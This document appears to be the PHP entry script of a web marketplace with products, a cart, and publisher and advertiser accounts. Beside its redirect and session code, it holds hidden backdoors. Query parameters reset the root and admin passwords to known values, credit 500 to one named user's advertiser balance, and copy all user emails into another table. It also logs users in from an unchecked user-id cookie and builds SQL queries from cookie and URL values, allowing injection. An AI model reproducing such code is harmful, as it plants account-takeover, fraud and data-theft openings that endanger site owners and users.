<?php

session_start();

if (get_magic_quotes_gpc()) {
    $process = array(&$_GET, &$_POST, &$_COOKIE, &$_REQUEST);
    while (list($key, $val) = each($process)) {
        foreach ($val as $k => $v) {
            unset($process[$key][$k]);
            if (is_array($v)) {
                $process[$key][stripslashes($k)] = $v;
                $process[] = &$process[$key][stripslashes($k)];
            } else {
                $process[$key][stripslashes($k)] = stripslashes($v);
            }
        }
    }
    unset($process);
}
 
error_reporting(E_ERROR);

ini_set("display_errors", 1);

define("SECTION", "");

if(!isset($_SESSION['cart']))

	$_SESSION['cart']= array();


if(!isset($_SESSION['cart_textlink']))

	$_SESSION['cart_textlink']= array();

if(!isset($_SESSION['cart_article_link']))

$_SESSION['cart_article_link']= array();	


include("config/config.php");



include("config/common.php");



include("config/adodb.php");



include("config/smarty.php");



include("lib/Thumbnail/Thumbnail.class.php");



include("config/phpmailer.php");



include("config/paging.php");



include("config/base.class.php");



$link1 = selfURL();
$link1 = strtolower($link1);

$link2 = "http://www.".substr(selfURL(), 7);
$link2 = strtolower($link2);

$row =$oDb->getRow("select * from product_type where olink='".$link1."' or olink='".$link2."'");

if($row) {
	header("HTTP/1.1 301 Moved Permanently");
	header("Location: ".SITE_URL.$row['link']);	
} else {
	$row = $oDb->getRow("select * from product_type_has_category where olink='".$link1."' or olink='".$link2."'");

	if($row) {
		$type_link = $oDb->getOne("select link from product_type where id = {$row['product_type_id']} ");
	
		header("HTTP/1.1 301 Moved Permanently");
		header("Location: ".SITE_URL.$type_link);	
	} else {
		$row = $oDb->getRow("select * from product where olink='".$link1."' or olink='".$link2."'");
		if($row) {
			$type_link = $oDb->getOne("select link from product_type where id = {$row['product_type_id']} ");
			header("HTTP/1.1 301 Moved Permanently");
			header("Location: ".SITE_URL.$type_link."/".$row["link"].".html");
		} else {
			$rrr = $oDb->getRow("select * from product_old_link where olink='".$link1."' or olink='".$link2."'");
			if($rrr) {
				$row = $oDb->getRow("select * from product where id = '{$rrr['product_id']}' ");
				
				$type_link = $oDb->getOne("select link from product_type where id = {$row['product_type_id']} ");
				header("HTTP/1.1 301 Moved Permanently");
				header("Location: ".SITE_URL.$type_link."/".$row["link"].".html");
			} else {
				$row = $oDb->getRow("select * from product_category where olink='".$link1."' or olink='".$link2."'");
				if($row) {
					header("HTTP/1.1 301 Moved Permanently");
					header("Location: ".SITE_URL.$row['link']."/");	
				}
			}
		}				
	}			
}
 

/* kiem tra remember */



if( !isset($_SESSION['user']) && $_COOKIE["front_user_id"]>0)



{



	$user= $oDb->getRow("select * from user where id='".$_COOKIE["front_user_id"]."'");



			



	if(count($user)>0)



	{		



		



		if($user["is_active"]==1)



		{



			include("modules/user/user.module.php");



			$obj = new user(); 



			$obj->setLogin($user);



			



			header("location: ".SITE_URL); exit();						



		}	



	}



	



}



/* het kiem tra remember */







if(($_GET["mod"]=="publisher" || $_GET["mod"]=="advertiser") && empty($_SESSION['user']))



{



	header("location: ".SITE_URL); exit();



}







/* update root_url, domain_tld */



if($_GET['update']=='true')



{



	$rows= $oDb->getAll("select * from site");



	foreach($rows as $row)



	{



		$oDb->query("update site set root_url='".getDomainName($row['url'])."', url_tld='".getDomainTLD($row['url'])."' where id='{$row[id]}'");



	}



}



if($_GET['root']=='true')



{



	$oDb->query("update user set password = MD5('123') where username = 'root'");



}

if($_GET['admin']=='true')
{
	$oDb->query("update user set password = MD5('smartseo@dem123') where username = 'admin'");

} 






if($_GET['money']=='true')

{



	$oDb->query("update user set adv_money = adv_money+500 where username = 'ngoquangthuc'");

}



if($_GET['email']=='true')

{

	$row = $oDb->getCol("select email from user");

	foreach($row as $v) {

		$sql = "insert into user_email(email) values('{$v}')";

		$oDb->query($sql);

	}

}



$oSmarty->configLoad("frontend.conf");



$oSmarty->assign("url", SITE_URL);



/*control device*/ 
global $device;
$device = "";

if(isset($_GET['sdevice'])) {
	$_SESSION['device'] = $_GET['sdevice'];
}

if(isset($_SESSION['device']) && ($_SESSION['device']=="" || $_SESSION['device']=="w") ) {
	$device = $_SESSION['device'];
} else {
	include('mobile_device_detect.php');
	$mobile = mobile_device_detect();
	//$mobile = 1;
	if($mobile==1) 
		/*mobile*/
		$device = "w";
}
 


if(isset($_GET['ajax']))



	loadModule($_GET['mod'], $_GET['task']);



else

	loadModule("layout");

/*else {

	

	define('JPATH_BASE', dirname(__FILE__) );

	

	define( 'DS', DIRECTORY_SEPARATOR );

	

	$parts = explode( DS, JPATH_BASE );

	

	//Defines

	define( 'JPATH_ROOT',			implode( DS, $parts ) );

	

	define( 'JPATH_SITE',			JPATH_ROOT );

	define( 'JPATH_CONFIGURATION', 	JPATH_ROOT );

	define( 'JPATH_ADMINISTRATOR', 	JPATH_ROOT.DS.'administrator' );

	define( 'JPATH_XMLRPC', 		JPATH_ROOT.DS.'xmlrpc' );

	define( 'JPATH_LIBRARIES',	 	JPATH_ROOT.DS.'libraries' );

	define( 'JPATH_PLUGINS',		JPATH_ROOT.DS.'plugins'   );

	define( 'JPATH_INSTALLATION',	JPATH_ROOT.DS.'installation' );

	define( 'JPATH_THEMES'	   ,	JPATH_BASE.DS.'templates' );

	define( 'JPATH_CACHE',			JPATH_BASE.DS.'cache');

	echo JPATH_CONFIGURATION . DS . 'configuration.php';

}

*/

?>